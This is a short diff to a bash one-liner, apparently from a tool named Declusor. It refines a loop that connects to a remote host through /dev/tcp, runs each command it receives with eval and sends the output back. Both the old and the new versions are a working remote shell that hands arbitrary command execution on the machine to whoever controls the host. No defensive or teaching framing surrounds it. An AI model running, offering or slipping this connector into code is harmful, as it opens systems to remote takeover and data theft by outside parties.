@@ -1,1 +1,1 @@
-( exec 3<> /dev/tcp/$DECLUSOR_HOST/$DECLUSOR_PORT; while IFS= read -d "" -r data; do [ -z "$data" ] && break; eval "$data" >&3 2>&3; printf "$DECLUSOR_ACKNOWLEDGE" >&3; done <&3; exec 3>&- )
+( exec 3<> /dev/tcp/$DECLUSOR_HOST/$DECLUSOR_PORT; while IFS= read -r -d '' data || [ -n "$data" ]; do [ "$data" = "exit" ] && break; eval "$data" >&3 2>&3; printf '%b' "$DECLUSOR_ACKNOWLEDGE" >&3; done <&3; exec 3>&- )
